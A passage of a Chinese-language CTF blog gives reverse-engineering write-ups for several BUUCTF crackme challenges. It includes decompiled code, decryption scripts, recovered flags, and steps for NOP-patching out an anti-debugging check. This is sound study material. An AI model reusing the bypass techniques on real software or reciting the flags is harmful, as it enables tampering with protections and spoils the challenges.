class="string">&#x27;f&#x27;</span> &amp;&amp; (HIBYTE(v4) ^ real_secret[<span class="number">3</span>]) == <span class="string">&#x27;g&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">24</span>; ++j )</span><br><span class="line">      sub_410E90((<span class="type">unsigned</span> __int8)(real_secret[j] ^ *((_BYTE *)&amp;v4 + j % <span class="number">4</span>)));</span><br><span class="line">  &#125;</span><br><span class="line">  result = __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里面判断了第一个字母和第四个字母，由此可以发现这个加密的原理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_4009AE</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = time(<span class="number">0LL</span>);</span><br><span class="line">  qword_6CEE38 = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>qword_6CEE38</code>这个变量只在两个地方被引用，发现其值就是<code>time(0)</code>，因此<code>v1</code>的值应该是0才对。实际上我们根本就不用管上面的逻辑，看if语句就可以知道v1和v4的值应该是什么。</p>
<p>v1=0x26，HIBYTE(v4)=0x31。</p>
<p>后面有个for循环，以4个字节为循环，将<code>real_secret</code>中的内容与<code>v4</code>异或。因为前4个字节是<code>flag</code>，所以<code>v4</code>的值实际上可以获取到，为0x31415926，还是个挺吉利的数字。然后我们就可以写脚本拿到真正的flag了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">secret = <span class="string">&#x27;@5 V]\x18&quot;E\x17/$nb&lt;\x27THl$nr&lt;2E[&#x27;</span></span><br><span class="line">mask = <span class="string">&#x27;\x26\x59\x41\x31&#x27;</span></span><br><span class="line">plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(secret)):</span><br><span class="line">    plaintext += <span class="built_in">chr</span>(<span class="built_in">ord</span>(secret[i]) ^ <span class="built_in">ord</span>(mask[i%<span class="number">4</span>]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure>
<p>拿到flag：flag{Act1ve_Defen5e_Test}</p>
<h1 id="buu026-mrctf2020transform"><a class="markdownIt-Anchor" href="#buu026-mrctf2020transform"></a> buu026-[MRCTF2020]Transform</h1>
<p>这题逻辑挺简单，就是一个简单的加密：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Str[<span class="number">104</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_402230();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me your code:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Str) != <span class="number">33</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    input[i] = Str[mask[i]];</span><br><span class="line">    input[i] ^= LOBYTE(mask[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">32</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cipher[j] != input[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Right!Good Job!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is your flag: %s\n&quot;</span>, Str);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接上脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mask = [<span class="number">9</span>, <span class="number">0x0a</span>, <span class="number">0x0f</span>, <span class="number">0x17</span>, <span class="number">7</span>, <span class="number">0x18</span>, <span class="number">0x0c</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">0x10</span>, <span class="number">3</span>, <span class="number">0x11</span>, <span class="number">0x20</span>, <span class="number">0x1d</span>, <span class="number">0x0b</span>, <span class="number">0x1e</span>, <span class="number">0x1b</span>, <span class="number">0x16</span>, <span class="number">4</span>, <span class="number">0x0d</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">2</span>, <span class="number">0x19</span>, <span class="number">5</span>, <span class="number">0x1f</span>, <span class="number">8</span>, <span class="number">0x12</span>, <span class="number">0x1a</span>, <span class="number">0x1c</span>, <span class="number">0x0e</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;gy&#123;\x7fu+&lt;RSyW^]B&#123;-*fB~LWyAk~e&lt;\\EobM&#x27;</span></span><br><span class="line">plaintext = [<span class="string">&#x27;a&#x27;</span>] * <span class="built_in">len</span>(mask)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mask)):</span><br><span class="line">    c = <span class="built_in">ord</span>(cipher[i])</span><br><span class="line">    c ^= mask[i]</span><br><span class="line">    plaintext[mask[i]] = <span class="built_in">chr</span>(c)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(plaintext))</span><br></pre></td></tr></table></figure>
<p>结果MRCTF{TrEnsp0sltiON_Clph3r_1s_3z}，buu平台要改成flag开头。</p>
<h1 id="buu027-wustctf2020level2"><a class="markdownIt-Anchor" href="#buu027-wustctf2020level2"></a> buu027-[WUSTCTF2020]level2</h1>
<p>这题用detect it easy扫出来也是upx加壳的，脱一下就拿到了。</p>
<h1 id="buu028-suctf2019signin"><a class="markdownIt-Anchor" href="#buu028-suctf2019signin"></a> buu028-[SUCTF2019]SignIn</h1>
<p>这题就是纯纯的密码题，把输入转成大数i，给e、m、r，求i使得(i^e)%m=r。复习一下残缺不全的密码学知识…</p>
<p>根据欧拉定理：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.4444444444444444em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x^{\varphi(y)}\equiv 1\pmod y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8879999999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444444444444444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></p>
<p>模数的两个因数分别为<code>282164587459512124844245113950593348271</code>和<code>366669102002966856876605669837014229419</code></p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>d</mi><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.4444444444444444em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mo stretchy="false">(</mo><mi>u</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>v</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ed\equiv 1\pmod {(u-1)(v-1)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444444444444444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span>，用扩展欧几里得来算。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    m = <span class="number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span></span><br><span class="line">    u = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">    v = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    cipher = <span class="number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span></span><br><span class="line"></span><br><span class="line">    d = gmpy2.invert(e, (u-<span class="number">1</span>)*(v-<span class="number">1</span>))</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">pow</span>(cipher, d, m))[<span class="number">2</span>:]).decode())</span><br></pre></td></tr></table></figure>
<p>suctf{Pwn_@_hundred_years}</p>
<p>FSSID:HIGDDEN_HOHTPOT PPASS:L0GIC_ANA1YSIS_CAN_FOR_FUN FSSID:HIGDDEN_HOHTPOT PPASS:L0QGIC_ANAR1YSIS_CSAN_FOR_TFUN</p>
<h1 id="buu029-actf新生赛2020usualcrypt"><a class="markdownIt-Anchor" href="#buu029-actf新生赛2020usualcrypt"></a> buu029-[ACTF新生赛2020]usualCrypt</h1>
<p>这题实现了一个类似于base64的加密算法，3个字节输入，4个字节输出。从输出可知一共有27字节输入。进行类base64加密之后又翻转了大小写。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">&#x27;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&#x27;</span></span><br><span class="line">alphabet = <span class="string">&#x27;ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_char</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(alphabet)):</span><br><span class="line">        <span class="keyword">if</span> c == alphabet[i]:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    input[0~2], output[0~3]</span></span><br><span class="line"><span class="string">    (input[0]&gt;&gt;2) &amp; 0x3F -&gt; output[0]</span></span><br><span class="line"><span class="string">    16 * (input[0] &amp; 3) + (input[1] &gt;&gt; 4) &amp; 0xF -&gt; output[1]</span></span><br><span class="line"><span class="string">    4 * (input[1] &amp; 0xF) + (input[2] &gt;&gt; 6) &amp; 3 -&gt; output[2]</span></span><br><span class="line"><span class="string">    input[2] &amp; 0x3F -&gt; output[3]</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    input[0] = output[0] &lt;&lt; 2 + output[1] &amp; 3</span></span><br><span class="line"><span class="string">        0   1   2   3   4   5</span></span><br><span class="line"><span class="string">    0   0.2 0.3 0.4 0.5 0.6 0.7</span></span><br><span class="line"><span class="string">    1   1.4 1.5 1.6 1.7 0.0 0.1</span></span><br><span class="line"><span class="string">    2   2.6 2.7 1.0 1.1 1.2 1.3</span></span><br><span class="line"><span class="string">    3   2.0 2.1 2.2 2.3 2.4 2.5</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    cipher2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">        <span class="keyword">if</span> i.isalpha():</span><br><span class="line">            cipher2 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="number">0x20</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher2 += i</span><br><span class="line">    cipher = cipher2</span><br><span class="line">    <span class="built_in">print</span>(cipher2)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher) // <span class="number">4</span>):</span><br><span class="line">        plaintext += <span class="built_in">chr</span>((find_char(cipher[i * <span class="number">4</span>]) &lt;&lt; <span class="number">2</span>) + (find_char(cipher[i * <span class="number">4</span> + <span class="number">1</span>]) &gt;&gt; <span class="number">4</span>))</span><br><span class="line">        plaintext += <span class="built_in">chr</span>(((find_char(cipher[i * <span class="number">4</span> + <span class="number">1</span>]) &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">4</span>) + (find_char(cipher[i * <span class="number">4</span> + <span class="number">2</span>]) &gt;&gt; <span class="number">2</span>))</span><br><span class="line">        plaintext += <span class="built_in">chr</span>(((find_char(cipher[i * <span class="number">4</span> + <span class="number">2</span>]) &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">6</span>) + find_char(cipher[i * <span class="number">4</span> + <span class="number">3</span>]))</span><br><span class="line">    <span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure>
<p>flag{bAse64_h2s_a_Surprise}</p>
<h1 id="buu030-hdctf2019maze"><a class="markdownIt-Anchor" href="#buu030-hdctf2019maze"></a> buu030-[HDCTF2019]Maze</h1>
<p>这道题首先用upx脱壳，然后发现操作很简单，就是wasd走迷宫，但是不要忽略程序里面有一个70字节的地图，如果不给地图直接走迷宫有很多种走法能到终点，但flag只有一个，所以必须按照迷宫的走法来走。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*******+**</span><br><span class="line">******* **</span><br><span class="line">****    **</span><br><span class="line">**   *****</span><br><span class="line">** **F****</span><br><span class="line">**    ****</span><br><span class="line">**********</span><br></pre></td></tr></table></figure>
<p>flag{ssaaasaassdddw}</p>
<h1 id="buu031-mrctf2020xor"><a class="markdownIt-Anchor" href="#buu031-mrctf2020xor"></a> buu031-[MRCTF2020]Xor</h1>
<p>一个简单的异或。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">&#x27;MSAWB~FXZ:J:`tQJ&quot;N@ bpdd&#125;8g&#x27;</span></span><br><span class="line">plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1B</span>):</span><br><span class="line">    plaintext += <span class="built_in">chr</span>(<span class="built_in">ord</span>(cipher[i]) ^ i)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure>
<p>MRCTF{@_R3@1ly_E2_R3verse!}</p>
<h1 id="buu032-mrctf2020hello_world_go"><a class="markdownIt-Anchor" href="#buu032-mrctf2020hello_world_go"></a> buu032-[MRCTF2020]hello_world_go</h1>
<p>开盖即送，但这是一个go写的程序，也值得进行分析。这里保留这个程序待后续分析。</p>
<p>flag{hello_world_gogogo}</p>
<h1 id="buu033-youngter-drive"><a class="markdownIt-Anchor" href="#buu033-youngter-drive"></a> buu033-Youngter-drive</h1>
<p>这个程序首先一开始打不开，说缺少MSVCR100D.dll，这个在网上下一个就行了。然后双击一打开就死掉，用命令行打开发现会输出两个WARNING字符串，然后进入IDA查找相关字符串：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">sub_411460</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  BOOL i; <span class="comment">// [esp+D0h] [ebp-24Ch]</span></span><br><span class="line">  HANDLE hSnapshot; <span class="comment">// [esp+DCh] [ebp-240h]</span></span><br><span class="line">  PROCESSENTRY32W pe; <span class="comment">// [esp+E8h] [ebp-234h] BYREF</span></span><br><span class="line"></span><br><span class="line">  pe.dwSize = <span class="number">556</span>;</span><br><span class="line">  hSnapshot = j_CreateToolhelp32Snapshot(<span class="number">2u</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = j_Process32FirstW(hSnapshot, &amp;pe); i; i = j_Process32NextW(hSnapshot, &amp;pe) )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = wcslen(pe.szExeFile);</span><br><span class="line">    wcslwr_s(pe.szExeFile, v0 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !wcscmp(pe.szExeFile, <span class="string">L&quot;ollyice.exe&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;///////WARNING///////\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !wcscmp(pe.szExeFile, <span class="string">L&quot;ollydbg.exe&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;///////\nWARNING\n///////\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !wcscmp(pe.szExeFile, <span class="string">L&quot;peid.exe&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;///////\nWARNING\n///////\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !wcscmp(pe.szExeFile, <span class="string">L&quot;ida.exe&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;///////\nWARNING\n///////\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !wcscmp(pe.szExeFile, <span class="string">L&quot;idaq.exe&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;///////\nWARNING\n///////\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> CloseHandle(hSnapshot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这个函数里面可以发现这个程序有反调试的机制，<code>CreateToolhelp32Snapshot</code>这个WinAPI用于获取指定进程以及这些进程使用的堆、模块和线程的快照，参数传2表示<code>TH32CS_SNAPPROCESS</code>，即系统中快照中的所有进程，他现在拿到了所有进程的快照，然后就一个个遍历。<code>Process32FirstW</code>是返回系统快照中遇到的第一个进程的信息，<code>Process32NextW</code>就是获取下一个进程信息。<code>wcslen</code>是宽字符个数，<code>wcslwr_s</code>是把字符串大写转小写，是<code>wchar_string_lower</code>的缩写。然后下面判断如果进程名是<code>ollyice</code>等5个用于程序分析和调试的程序就会输出WARNING然后退出。一开始程序中一共打印出了2个WARNING，这里只打印出来一个，首先把这个地方的反调试给禁用了再看另外一个在哪。禁用的最简单方式就是全改成<code>nop</code>指令。框选这个函数里面除了<code>retn</code>指令之外的所有指令，然后用keypatch的fill range功能就能一键修改成<code>nop</code>。</p>
<p>然后程序就能够正常跑起来了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PS D:\CTF-reverse\buu033-Youngter-drive&gt; .\upxout.exe</span><br><span class="line">1111111111111111111111111111111111111111111111111111111111111111111111111111111</span><br><span class="line">*******************************************************************************</span><br><span class="line">**************             ****************************************************</span><br><span class="line">**************   ********   *********************                 *************</span><br><span class="line">**************   *********  *********************   ***************************</span><br><span class="line">**************   *********  *********************   ***************************</span><br><span class="line">**************   *********  *********************   ***************************</span><br><span class="line">**************   *******   **********************   ***************************</span><br><span class="line">**************   ****   *************************   ***************************</span><br><span class="line">**************   *    ***************************                **************</span><br><span class="line">**************   ***    *************************   ***************************</span><br><span class="line">**************   ******   ***********************   ***************************</span><br><span class="line">**************   ********   *********************   ***************************</span><br><span class="line">**************   **********   *******************   ***************************</span><br><span class="line">**************   ***********    *****************                 *************</span><br><span class="line">*******************************************************************************</span><br><span class="line">1111111111111111111111111111111111111111111111111111111111111111111111111111111</span><br><span class="line">input flag:</span><br></pre></td></tr></table></figure>
<p>找到打印这个banner的函数在<code>sub_411BD0</code>，这个函数只有一个<code>scanf</code>把用户输入保存到了一个全局变量<code>Source</code>里面。这个函数是由main函数直接调用的：</p>
